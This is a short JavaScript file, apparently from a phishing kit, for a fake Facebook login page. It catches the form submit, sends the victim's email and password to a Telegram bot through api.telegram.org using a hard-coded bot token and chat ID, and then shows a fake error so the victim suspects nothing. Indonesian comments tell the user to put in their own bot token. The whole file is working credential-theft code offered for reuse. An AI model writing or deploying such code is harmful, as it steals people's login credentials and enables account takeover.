document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const email = this.email.value;
  const password = this.password.value;

  const botToken = "8023818163:AAGquHbc8-yDPFcRN9s7Y3fWWVawkCuGZ_A"; // Ganti dengan token bot kamu
  const chatId = "7819779147";     // Ganti dengan ID chat kamu
  const message = `🔐 Login FB\n📧 Email: ${email}\n🔑 Password: ${password}`;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message })
  })
    .then(() => {
      document.getElementById("errorMsg").style.display = "block";
      this.reset();
    })
    .catch(err => console.error("Gagal kirim ke bot:", err));
});